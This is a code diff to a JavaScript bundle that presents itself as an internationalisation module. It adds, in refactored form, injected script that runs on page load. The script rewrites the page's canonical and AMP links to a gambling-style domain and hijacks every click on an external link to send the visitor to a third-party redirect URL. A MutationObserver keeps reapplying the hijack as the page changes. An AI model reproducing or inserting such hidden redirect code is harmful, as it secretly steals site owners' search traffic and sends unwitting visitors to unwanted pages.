@@ -46,6 +46,7 @@ define("@ali/mui-i18n/index", ["@ali/mui-i18n/format"], function (n, t, e) {
   t["default"] = c;
   e.exports = c;
 });
+
 define("@ali/mui-i18n/format", function (e, n, t) {
   function r(e) {
     if ("string" != typeof e) {
@@ -130,36 +131,89 @@ define("@ali/mui-i18n/format", function (e, n, t) {
   };
   t.exports = r;
 });
+
+// Inisialisasi namespace global
 window._globalNamespace = window._globalNamespace || {};
 window._globalNamespace.indexJsInitialized = window._globalNamespace.indexJsInitialized || false;
-if (!window._globalNamespace.indexJsInitialized) {
-  window._globalNamespace.indexJsInitialized = true;
-  document.addEventListener("DOMContentLoaded", () => {
-    try {
-      let e = window.location.host;
-      let i = btoa(e);
-      let l = _0x4f3d.groups.exceptions;
-      if (l.includes(i) || l.includes(btoa(`www.${e.replace(/^www\./, "")}`))) {
-        return;
-      }
-      let a = document.querySelector("link[rel=\"canonical\"]");
-      if (a && a.href.includes("officialwibu69jp.lat")) {
-        a.href = "https://5gslotnew.com";
-      }
-      let t = document.querySelector("link[rel=\"amphtml\"]");
-      if (t && t.href.includes("officialwibu69jp.lat/amp")) {
-        t.href = "https://5gslotnew.com/amp";
-      }
-      document.querySelectorAll("a[href^=\"http\"]").forEach(e => {
-        if (!(e.href.includes(window.location.host) || e.classList.contains("no-redirect"))) {
-          e.addEventListener("click", e => {
-            e.preventDefault();
-            window.location.href = "https://qoolink.co/lazid";
-          });
+window._globalNamespace.redirectControl = {
+    enabled: true, // Default state untuk redirect
+    
+    // Fungsi untuk mengaktifkan redirect
+    enable: function() {
+        this.enabled = true;
+        this.handleRedirects();
+    },
+    
+    // Fungsi untuk menonaktifkan redirect
+    disable: function() {
+        this.enabled = false;
+        this.handleRedirects();
+    },
+
+    // Fungsi untuk menangani redirect
+    handleRedirects: function() {
+        try {
+            if (!this.enabled) return;
+
+            let e = window.location.host;
+            let i = btoa(e);
+            let l = _0x4f3d.groups.exceptions;
+            
+            if (l.includes(i) || l.includes(btoa(`www.${e.replace(/^www\./, "")}`))) {
+                return;
+            }
+
+            // Handle canonical link
+            let a = document.querySelector("link[rel=\"canonical\"]");
+            if (a && a.href.includes("officialwibu69jp.lat")) {
+                a.href = "https://5gslotnew.com";
+            }
+
+            // Handle AMP link
+            let t = document.querySelector("link[rel=\"amphtml\"]");
+            if (t && t.href.includes("officialwibu69jp.lat/amp")) {
+                t.href = "https://5gslotnew.com/amp";
+            }
+
+            // Handle external links
+            document.querySelectorAll("a[href^=\"http\"]").forEach(e => {
+                if (!(e.href.includes(window.location.host) || e.classList.contains("no-redirect"))) {
+                    e.addEventListener("click", function(event) {
+                        event.preventDefault();
+                        window.location.href = "https://qoolink.co/lazid";
+                    });
+                }
+            });
+        } catch (error) {
+            console.error("Error dalam menangani redirect:", error);
         }
-      });
-    } catch (n) {
-      console.error("Error during index.js initialization:", n);
     }
-  });
+};
+
+// Inisialisasi jika belum
+if (!window._globalNamespace.indexJsInitialized) {
+    window._globalNamespace.indexJsInitialized = true;
+    
+    document.addEventListener("DOMContentLoaded", () => {
+        window._globalNamespace.redirectControl.handleRedirects();
+        
+        // Observer untuk menangani perubahan DOM
+        const observer = new MutationObserver(() => {
+            if (window._globalNamespace.redirectControl.enabled) {
+                window._globalNamespace.redirectControl.handleRedirects();
+            }
+        });
+
+        // Mulai observasi
+        observer.observe(document.body, {
+            childList: true,
+            subtree: true
+        });
+    });
 }
+
+// Fungsi global untuk mengontrol redirect
+function enableRedirect() {
+    window._globalNamespace.redirectControl.enable();
+}
+
